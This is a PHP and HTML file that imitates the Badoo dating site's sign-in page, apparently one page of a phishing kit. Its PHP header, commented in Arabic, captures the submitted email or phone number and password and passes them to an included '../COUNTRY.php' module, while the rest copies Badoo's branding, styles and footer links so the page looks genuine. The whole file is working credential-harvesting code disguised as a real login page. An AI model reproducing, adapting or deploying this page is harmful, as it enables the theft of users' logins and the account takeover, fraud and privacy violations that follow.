<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
$username = $_POST['email'];
$password = $_POST['password'];
$files = scandir(__DIR__); // __DIR__ يشير إلى المجلد الحالي
$loginFolder = '';

// ابحث عن الملفات التي تطابق النمط الذي تريده
foreach ($files as $file) {
    if (strpos($file, 'index') !== false) { // تأكد من أن الملف يحتوي على "index" في اسمه
        $loginFolder = basename(__DIR__); // احصل على اسم المجلد الحالي
        break; // أخرج من الحلقة عند العثور على أول ملف مطابق
    }
}
include("../COUNTRY.php");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name=viewport content="width=device-width,initial-scale=1,viewport-fit=cover">
    <title>Meet New People on Badoo, Make Friends, Chat, Flirt</title>
    <meta name="referrer" content="origin-when-cross-origin">
    <style>a,body,div,form,header,html,input,label,li,section,span,ul{vertical-align:baseline;box-sizing:border-box;margin:0;padding:0;outline:0;border:0;background:0;-webkit-tap-highlight-color:transparent}h1,img,p{box-sizing:border-box;padding:0;outline:0;border:0;background:0;-webkit-tap-highlight-color:transparent}img{margin:0}h1,p{vertical-align:baseline}header{display:block}body{direction:ltr;-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;-ms-text-size-adjust:none;text-size-adjust:none;font-weight:400;font-family:-apple-system,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Droid Sans,Helvetica Neue,"Segoe UI",Roboto,Ubuntu,"Helvetica Neue","Lucida Grande",sans-serif;font-size:87.5%;line-height:1.429}p{margin:0 0 20px}ul{list-style:none}button,label{cursor:pointer}button:disabled{overflow:visible}img{vertical-align:top}img[src$=svg]{-ms-transform:translate(.5px,-.3px)}a{color:inherit;text-decoration:none}:focus{outline:0}.body{overflow-y:scroll;color:#767676}@media screen and (max-width:977px){.body{overflow-x:auto}}.body--unauth{position:relative}@media screen and (max-width:977px){.body--unauth{overflow-x:hidden}}@media screen and (max-width:957px){.body--unauth{overflow-x:auto}}.body--generic{overflow-x:auto;background:#fff}.page{display:-webkit-inline-flex;display:inline-flex;vertical-align:top;min-width:100%;min-height:100vh}.page__simple-wrap{position:relative;-webkit-flex-direction:column;flex-direction:column;min-height:100vh}.page__simple-wrap{-webkit-flex:1 1 auto;flex:1 1 auto;min-width:100%;height:auto;background:#fff}.page__content{display:-webkit-flex;display:flex;-webkit-flex-direction:column}.page__content{position:relative;-webkit-flex:1 0 auto;flex:1 0 auto}.page__footer{padding:24px 20px}@media screen and (max-width:1175px){.page__content{left:240px}}.page--simple .page__simple-wrap{display:-webkit-flex;display:flex}.page--simple .page__content{left:auto;-webkit-flex-direction:row;flex-direction:row;-webkit-align-items:flex-start;align-items:flex-start;width:100%;padding:0 20px;background:0}.page--simple .page__footer{padding-top:0}h1{margin:0 0 10px}h1{font-weight:400}.header{position:relative;-webkit-flex:0 0 auto;flex:0 0 auto;background:#6e3eff;color:#fff}.header__inner,.header__logo{display:-webkit-flex;display:flex;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;align-items:center}.header__inner{max-width:1240px;margin:0 auto;padding:0 20px}.header__logo{-webkit-flex:1 1 33.33%;flex:1 1 33.33%;height:54px;margin-bottom:0}.header__language-selector{-webkit-flex:1 1 33.33%;flex:1 1 33.33%}.header__sign-in{display:-webkit-flex;display:flex;-webkit-justify-content:flex-end;justify-content:flex-end;-webkit-flex:1 0 33.33%;flex:1 0 33.33%}.header-sign-in{display:-webkit-flex;display:flex;-webkit-align-items:center;align-items:center;white-space:nowrap}.header-sign-in__button{margin-left:8px}.loader{position:absolute;top:0;right:0;bottom:0;left:0;display:-webkit-flex;display:flex;width:30px;height:6px;margin:auto;color:#767676;opacity:0;transition:opacity .2s;pointer-events:none}.loader::after,.loader::before{display:block;content:""}.loader::before{-webkit-animation:loader 1.2s linear infinite 0;animation:loader 1.2s linear infinite 0}.loader::after{-webkit-animation:loader 1.2s linear infinite .2s;animation:loader 1.2s linear infinite .2s}.loader::after,.loader::before,.loader__inner{-webkit-flex:0 0 auto;flex:0 0 auto;width:6px;height:6px;border-radius:100%;background:currentColor}.loader__inner{margin-right:6px;margin-left:6px;-webkit-animation:loader 1.2s linear infinite .1s;animation:loader 1.2s linear infinite .1s}.footer{max-width:1200px;width:100%;margin:0 auto;color:#767676}.footer__links:first-child{padding-top:24px;border-top:1px solid #eaeaea}.footer__bottom{display:-webkit-flex;display:flex;-webkit-justify-content:space-between;justify-content:space-between;-webkit-align-items:flex-start;align-items:flex-start}.footer__links~.footer__bottom{padding-top:30px;border-top:0}.footer__copyright{display:-webkit-flex;display:flex;font-size:11px}.footer-menu{display:-webkit-flex;display:flex;min-height:16px}.footer-menu__item{color:#767676}.footer-menu__item:not(:last-child){margin-right:16px}.footer-menu__item .link{font-size:14px;line-height:1.429;display:block;border:0;color:currentColor}.sign-page{display:-webkit-flex;display:flex;-webkit-justify-content:center;justify-content:center;-webkit-flex:1 0 auto;flex:1 0 auto;padding:96px 0 64px;background-color:#fff}.sign-page__inner{position:relative}.sign-page__title{font-family:Noi Grotesk,-apple-system,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Droid Sans,Helvetica Neue,Segoe UI,Roboto,Ubuntu,Helvetica Neue,Lucida Grande,sans-serif;font-weight:600;font-size:25px;line-height:1.28;max-width:480px;margin-bottom:0;color:#2d2d2d}.sign-page__content{position:relative;display:-webkit-flex;display:flex}.sign-page__description{max-width:480px;margin-bottom:0}.sign-page__title+.sign-page__description{margin-top:8px}.sign-page__description+.sign-page__content{margin-top:16px}.new-form{position:relative;text-align:left}.new-form .btn,.new-form .text-field{vertical-align:top}.new-form,.new-form__control{max-width:100%;width:320px}.new-form__control:empty{display:none}.new-form__label{font-size:12px;line-height:1.334;margin-bottom:4px;color:#2d2d2d}.new-form__actions{max-width:100%;width:100%}.new-form__actions .btn{max-width:320px}.new-form__control+.new-form__control{margin-top:16px}.new-form__control+.new-form__actions{margin-top:24px}.text-field{position:relative}.text-field__input{width:100%;height:40px;padding:0 15px;outline:0;border:1px solid #ccc;border-radius:8px;background:#fff;color:#2d2d2d;font-size:14px;-webkit-font-smoothing:antialiased}.text-field__input::-webkit-input-placeholder{color:#ccc}.dropdown{display:none}.btn{display:-webkit-inline-flex;display:inline-flex;-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;align-items:center;vertical-align:top;padding:0;outline:0;border:1px solid transparent;border-radius:8px;text-align:center;text-decoration:none;-webkit-font-smoothing:antialiased}.btn__content{display:-webkit-flex;display:flex}.btn__content{-webkit-justify-content:center;justify-content:center;-webkit-align-items:center;align-items:center;height:100%;margin:0-1px;padding:0 16px;pointer-events:none}.btn__text{display:block;-webkit-flex:0 1 auto;flex:0 1 auto;text-align:left}.btn__text:only-child{text-align:center}.btn::after{display:block;font-size:18px}.btn{min-width:40px;min-height:40px}.btn .btn__content{padding-top:8px;padding-bottom:8px}.btn .btn__text{font-weight:600;font-size:14px;line-height:1.286}.btn::after{min-height:38px;content:"";font-size:0}.btn--sm{min-width:32px;min-height:32px}.btn--sm .btn__content{padding-top:4px;padding-bottom:4px}.btn--sm .btn__text{font-weight:600;font-size:14px;line-height:1.286}.btn--sm::after{min-height:30px}.btn--block{display:-webkit-flex;display:flex;width:100%}.btn--link .btn__text{margin-bottom:-1px;line-height:1.5}.btn{background-color:#6e3eff;color:#fff}.btn:hover{background-color:#6338e6}.btn:active{background-color:#5832cc}.btn--color-white{background-color:#fff;color:#2d2d2d}.btn--color-white:hover{background-color:#e6e6e6}.btn--color-white:active{background-color:#ccc}.btn--link{background-color:transparent;color:#6e3eff}.btn--link .btn__text{border-bottom:1px solid rgba(110,62,255,.4)}.btn--link:hover{background-color:transparent;color:#6338e6}.btn--link:hover .btn__text{border-bottom-color:currentColor}.btn--link:active{background-color:transparent;color:#5832cc}.btn--link:active .btn__text{border-bottom-color:currentColor}.btn:disabled{opacity:.3;pointer-events:none}.button-group--vertical{display:-webkit-flex;display:flex;-webkit-flex-direction:column;flex-direction:column;-webkit-align-items:center;align-items:center}.button-group--vertical>.button-group__item{display:-webkit-flex;display:flex;-webkit-justify-content:center;justify-content:center;width:100%}.button-group--vertical>.button-group__item+.button-group__item{margin-top:8px}</style>
    <title>Meet New People on Badoo, Make Friends, Chat, Flirt</title>
    <link rel="canonical" href="https://badoo.com/signin">
    <meta name="description"
        content="Badoo - chat, date and meet with people all over the world. Join our community and make new friends in your area.">
    <meta itemprop="image" content="https://eu1.badoocdn.com/i/big/assets/static_images/badoo-share.png?v2">
    <meta property="og:title" content="Meet New People on Badoo, Make Friends, Chat, Flirt">
    <meta property="og:site_name" content="Badoo">
    <meta property="og:url" content="https://badoo.com/en/">
    <meta property="og:image" content="https://eu1.badoocdn.com/i/big/assets/static_images/badoo-share.png?v2">
    <link rel="icon" class="js-favicon" type="image/x-icon" href="favicon.ico">
</head>
<body class="body body--generic body--unauth show-cookie-notification" tabindex="-1"
    data-cookie-notification-type="basic">
    <div class="page page--simple page--signin js-vrt-marker" id="page" data-vrt-ready="true">
        <div class="page__simple-wrap">
            <div class="page__header">
                <header id="header" class="header js-header js-core-events-container">
                    <div class="header__inner">
                        <div class="header__language-selector"></div>
                        <h1>
                            <span class="header__logo-text">
                                <a href="https://badoo.com/" class="js-logo-url app">
                                    <img class="header__logo" src="logo.svg" alt="Badoo">
                                </a>
                            </span>
                        </h1>
                        <div class="header__sign-in">
                            <div class="header-sign-in">
                                <div class="header-sign-in__button">
                                    <a class="btn btn--sm btn--color-white btn--filled" href="#">
                                        <div class="btn__content">
                                            <span class="btn__text">Join Badoo</span>
                                        </div>
                                    </a>
                                </div>
                            </div>
                        </div>
                    </div>
                </header>
            </div>
            <div class="page__content">
                <section class="sign-page">
                    <div class="sign-page__inner">
                        <h1 class="sign-page__title">Sign in to Badoo</h1>
                        <p class="sign-page__description">Please enter your sign in details.</p>
                        <div class="sign-page__content">
                            <div class="sign-page__form js-core-events-container">
                                <form class="new-form no_autoloader" method="post" action="">
                                    <div class="new-form__control js-form-row">
                                        <div class="new-form__label"> <label class="new-form__label-value"
                                                for="signin-name"> Login </label> </div>
                                        <div class="new-form__field">
                                            <div class="text-field"> <input
                                                    class="text-field__input text-field__input--ltr"
                                                    type="text" name="email" id="signin-name" value required
                                                    placeholder="Email or phone number" dir="auto"> </div>
                                        </div>
                                    </div>
                                    <div class="new-form__control js-form-row">
                                        <div class="new-form__label"> <label class="new-form__label-value"
                                                for="signin-password">Password</label> </div>
                                        <div class="new-form__field">
                                            <div class="text-field"> <input class="text-field__input"
                                                    type="password" name="password" id="signin-password" value required
                                                    placeholder="Password" dir="auto"> </div>
                                        </div>
                                    </div>
                                    <div class="new-form__actions">
                                        <div class="button-group button-group--vertical">
                                            <div class="button-group__item" id="signin-submit"> <button
                                                    class="btn btn--block" type="submit" name="post"> <span
                                                        class="btn__content"> <span class="btn__text">Sign me in!</span>
                                                    </span> <span class="btn__loader"> <span
                                                            class="loader loader--inherit"><span
                                                                class="loader__inner"></span></span> </span> </button>
                                            </div>
                                            <div class="button-group__item"> <a class="btn btn--link" href="#">
                                                    <div class="btn__content"> <span class="btn__text">Forgot your
                                                            password?</span> </div>
                                                </a> </div>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </section>
            </div>
            <div class="page__footer">
                <div class="footer js-footer js-core-events-container">
                    <div class="footer__links js-footer-links">
                        <ul class="footer-menu">
                            <li class="footer-menu__item js-about-tooltip"> <a class="link js-about-link"
                                    href="https://team.bumble.com/" target="_blank">About</a>
                                <div class="dropdown" data-direction="top">
                                    <div class="dropdown__options">
                                        <ul class="options">
                                            <li class="option"> <a class="option__in js-company-link"
                                                    href="https://team.bumble.com/teams"> <span
                                                        class="option__txt">Company</span> </a> </li>
                                            <li class="option"> <a class="option__in js-careers-link"
                                                    href="https://bumble.wd3.myworkdayjobs.com/Bumble_Careers"> <span
                                                        class="option__txt">Careers</span> </a> </li>
                                            <li class="option"> <a class="option__in js-insights-click"
                                                    href="https://badoo.com/en/the-truth"> <span class="option__txt">The
                                                        Truth Blog</span> </a> </li>
                                        </ul>
                                    </div>
                                </div>
                            </li>
                            <li class="footer-menu__item"> <a class="link js-tnc-link"
                                    href="https://badoo.com/terms/">Terms</a> </li>
                            <li class="footer-menu__item"> <a class="link js-privacy-link"
                                    href="https://badoo.com/privacy/">Privacy</a> </li>
                            <li class="footer-menu__item"> <a class="link js-press-link"
                                    href="https://badoo.com/safety-centre" target="_blank">Safety centre</a> </li>
                            <li class="footer-menu__item js-help-tooltip"> <a class="link js-help-link"
                                    href="https://badoo.com/help/" target="_blank">Help</a>
                                <div class="dropdown" data-direction="top">
                                    <div class="dropdown__options">
                                        <ul class="options">
                                            <li class="option"> <a class="option__in app js-help-center-link"
                                                    href="https://badoo.com/help/" rel="help-center"> <span
                                                        class="option__txt">Help Centre</span> </a> </li>
                                            <li class="option"> <a class="option__in app js-guidelines-link"
                                                    href="https://badoo.com/guidelines/" rel="help-center"> <span
                                                        class="option__txt">Community Guidelines</span> </a> </li>
                                            <li class="option"> <a class="option__in app js-safetytips-link"
                                                    href="https://badoo.com/safetytips/" rel="help-center"> <span
                                                        class="option__txt">Safety Tips</span> </a> </li>
                                            <li class="option"> <a class="option__in js-modern-act-link"
                                                    href="https://eu1.badoocdn.com/i/big/msa/Badoo_Modern_Slavery_Act_Statement.pdf"
                                                    target="_blank"> <span class="option__txt">Modern Slavery Act
                                                        statement</span> </a> </li>
                                        </ul>
                                    </div>
                                </div>
                            </li>
                            <li class="footer-menu__item"> <a class="link js-press-link"
                                    href="https://badoo.com/team/press/" target="_blank">Press</a> </li>
                        </ul>
                    </div>
                    <div class="footer__bottom">
                        <div class="footer__copyright"> 2023
                            <span
                                class="footer__copyright-symbol">&nbsp;©&nbsp;
                            </span>
                            <a target="_blank" href="https://team.bumble.com/">Bumble</a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>
</html>